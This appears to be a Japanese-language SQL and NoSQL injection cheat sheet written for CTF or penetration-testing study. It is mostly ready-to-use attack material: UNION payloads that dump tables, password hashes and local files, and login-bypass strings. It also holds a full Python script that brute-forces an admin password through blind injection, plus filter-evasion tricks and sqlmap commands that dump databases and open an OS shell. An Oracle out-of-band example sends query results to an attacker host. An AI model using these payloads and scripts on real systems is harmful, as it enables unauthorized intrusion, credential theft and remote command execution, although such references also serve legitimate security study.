# SQL Injection

### テーブル一覧を取得

SQL文の実行後にUNIONで繋げたSQL文を実行する。NULLの数は最初のSQLのカラム数に合わせて適宜変更する。
'UNION SELECT TABLE_NAME,NULL FROM information_schema.tables#

テーブルの中を取得
'UNION SELECT * FROM secretbook#

または
'UNION SELECT id,first_name,last_name,job,delete_flag from users#

列名を取得
'UNION SELECT table_name,column_name,NULL,NULL,NULL FROM information_schema.columns#

ローカルのファイルにアクセス
'union select load_file('/var/ctf/flag.md'),1,2,3,4#

### ユーザ一覧を取得

 ') UNION SELECT 1, name, is_admin, password_hash,4 FROM user --

### お約束のやつ

'OR 1=1 \-\- #MySQLはハイフンの後に半角スペースが必須
' OR 1=1 #
' OR 'a'='a

### 結果として何かしらの文字列を返すようにしたいなら

何も出ないクエリの後ろにunionでselect \[出したい文字列\]をくっつければいい
文字列を作る際にはクォートを使ってもいいが、CHAR(16進)でもいい
その場合はCyberchefでToHexのDelimiterを0x with commmaにする

### 文字コードからの文字の作成
扱いたい文字をCyberchefでToCharCodeのBase10のレシピで調理する。
その結果をchr(結果)という風にする

### ブラインドSQLインジェクションによるパスワード解析
```
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse

#環境変数からアクセス先のURLとクッキーを取得する
url = os.environ['SQLI_URL']
cookie = os.environ['SQLI_COOKIE']

#パスワード解析に利用する文字列としてUTF-8で文字列0～9,a～zA～Zと記号を用意する
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_","@","$","!","?","&","#"]
#ヘッダにクッキー情報を格納
headers= {'Cookie':'PHPSESSID='+cookie}

#攻撃用関数
def attack(attack_sql):
#URLにパラメータと渡されたsqlインジェクションの構文をURLエンコードしたものをくっつけてattack_urlとして保持
    attack_url = url + '?pw=' + urllib.parse.quote(attack_sql)
    #print(attack_url)
#attack_urlとヘッダを送信してレスポンスを取得
    res = requests.get(attack_url, headers=headers)
    #print(res.text)
#レスポンスを返す
    return res

#sqlインジェクションに使用するクエリを作る関数。渡されるのは解析するパスワード文字列
def create_pass_query(pw):
#解析するパスワード文字列を使用してクエリを作る。作られたクエリはパスワードが空白、またはIDがadminかつ
#「データベースに格納されているpwの文字列から解析するパスワード文字列の文字数+1文字目の文字がパスワード解析用文字列の最後の文字と同じなら」となる
#↑だとわかりづらい「解析用文字列の最後の文字と格納されている文字列の同じ文字目を比較して同じかどうかを比較している」
    query = "'or id='admin' and substr(pw," + str(len(pw)) + ",1)='" + pw[-1]
#作成したクエリを返す
    return query

def check_result(res):
    if 'Hello admin' in res.text:
        return True
    return False

####################
###     main     ###
####################

#解析できたパスワードが入る変数
fix_pass = ""
is_end = False
#is_endフラグがtrueになるまで繰り返す
while not is_end:
#パスワード解析に利用する文字列の繰り返し。つまりブルートフォースする
    for c in candidates:
#解析できたパスワードに一文字付け足して解析するパスワードの文字列を作る
        try_pass = fix_pass + str(c)
#今回解析に使う文字列を表示
        print(try_pass)
#解析に使う文字列を渡してsqlインジェクションに使用するクエリを作る
        query = create_pass_query(try_pass)
#作ったクエリを使用してSQLインジェクションを実行する
        res = attack(query)
#結果の確認。成功していれば使用した文字を解析済みパスワードの文字列に加えて次の桁へ
        if check_result(res):
            fix_pass += c
            break

#もしも使用する文字列が#までいったならpwの末尾まで行っていると判断して終了フラグを立てて終わりにする
        if c == '#':
            is_end = True
            
#最後に解析したpwを表示する
print("result: " + fix_pass)
```

### nosql用
確認用文字列
```
'"\/$[].>

ログインバイパス
admin'||'1==


' || 1==1//
' || 1==1%00
term || '1'=='1



または否定をつかう[$ne]は!なので[$ne]=とすると!=になる
[$ne]=nobody
```

### 勉強用サイト

SQL injection UNION attacks
https://portswigger.net/web-security/sql-injection/union-attacks

sqlinjection.net
https://www.sqlinjection.net/

### sqlmap
sqlmap -u "http://192.168.182.121/vaccine.php?prefecture=Tokyo&action=search" --dbs
sqlmap -u "http://192.168.182.121/vaccine.php?prefecture=Tokyo&action=search" -D mydb --tables 
sqlmap -u "http://192.168.182.121/vaccine.php?prefecture=Tokyo&action=search" -T COVID21  --dump
sqlmap -u http://m3.mod8.axof.intra.hckr.jp/search.php?kind=cat --proxy=http://127.0.0.1:8080 --os-cmd="find / -name flag |grep -v denied"
シェルだとfindとか使えないので使いたかったらos-cmdの方を使う
sqlmap -u http://m3.mod8.axof.intra.hckr.jp/search.php?kind=cat --proxy=http://127.0.0.1:8080 --os-shell

Burpで取得したリクエストをもとにしたい場合は-rオプションを使うとできる
手順
burpを通している状態で一度リクエストを発生させる
historyから保存したいリクエストを選んでハンバーガーメニューのSave Itemを選ぶ
sqlmapの-rオプションを使ってコマンドを投げる
sqlmap -r post -dbs -proxy="http://127.0.0.1:8080"

### NoSQL Injector
NoSQL攻撃用のツール。
https://github.com/Charlie-belmer/nosqli

### NoSQL Exploitation Framework
NoSQL 攻撃用のフレームワーク
インストールがうまくいかない動くならよさそう
https://github.com/torque59/Nosql-Exploitation-Framework

### Nosqlチートシート
https://nullsweep.com/nosql-injection-cheatsheet/

### SQL injection with no space
パラメータにスペースを入れることができない場合、/\**/や\`をスペース代わりにすることができる
または、%09（水平タブ）、%0A（改行）、%0B（垂直タブ）、%0C（フォームフィード）、%0D（キャリッジリターン）、%A0（非改行スペース）
あたりもスペースの代わりになることがある。
%0B（垂直タブ）、%0C（フォームフィード）は空白の代わりになった

### MySQLの文字列と数字の比較、計算
MySQLは数字と文字列を比較する際には文字列の左の数字の部分だけを読み取る
例）12個"＋3=15
この時、数字が文字列に含まれていない場合は０になる

### or and の代用
orとかandは\|\|や\&\&で代用できる

### substr や = の代用
likeで代用できる。また、likeは文字列の代わりにhexで文字列を指定することもできる。
その場合adminは 0x61646d696e になる
\=はinでも代用できる。その場合は検索条件を()で囲む必要がある
substrはmidで代用できる

### 末尾コメント化について
SQL Injectionをする際に元々あるクエリをコメント化する場合がある。
\#
-\- ハイフンの後には半角スペースが必須
;%00 セミコロンで計算式を終わらせてNULLで行末だと処理させる。%00はURLエンコードした場合なので\00だったりもするかもしれない。

### コメント化の回避
クエリに最初から#とかでコメント化されている場合、改行を挟むことでコメント化を回避できる。
URLエンコードでの改行は %0a

### レコードの特定の行が取りたい場合
LIMIT句を使う。以下のクエリで取得したレコードの２つ目から5つのデータを取得するようになる
SELECT * FROM user LIMIT 2, 5;

### preg_match
phpの関数であるpreg_matchは第一引数として渡された文字列を台に引数として渡された文字列から検索する。
そのさいに第一引数は/で囲むが、/の外にiがあれば大文字小文字を区別せず扱い、iがなければ大文字小文字を区別する。
データベースによっては大文字小文字を区別しないものもあるので、大文字小文字を区別してフィルタしているのであれば文字列のどこかをフィルタされているものと変えればバイパスできる

### addslashes
phpの関数であるaddslashesは渡された文字列内の',",\\,nullに\を付けてエスケープする


### str_replace
phpの関数であるstr_replaceは第３引数の文字列から第1引数の文字列を探して第2引数の文字列に置き換える。
置き換えた後に文字列が目標の文字列になるようにすればよい

### 帯域外SQLインジェクション
データベースサーバがDNSまたはHTTP要求を行うことができる場合に使用可能。
SQLのクエリの後に攻撃者の用意したサーバに対してHTTPかDNSのリクエストを投げ、そのリクエストの中に攻撃者の実行したいSQLの返りを含ませること

``` SQL
#以下のSQL文では通常のクエリのあとにOracleデータベースの機能であるUTL_HTTP.requestを使って攻撃者の管理しているサーバに対してHTTPのリクエストを投げている。そしてリクエストを投げる際に攻撃者が用意したSQL文の実行結果をつけて送ることによって情報を取得しようとしている
SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM DUAL)) --
```
参考
https://www.acunetix.com/blog/articles/blind-out-of-band-sql-injection-vulnerability-testing-added-acumonitor/
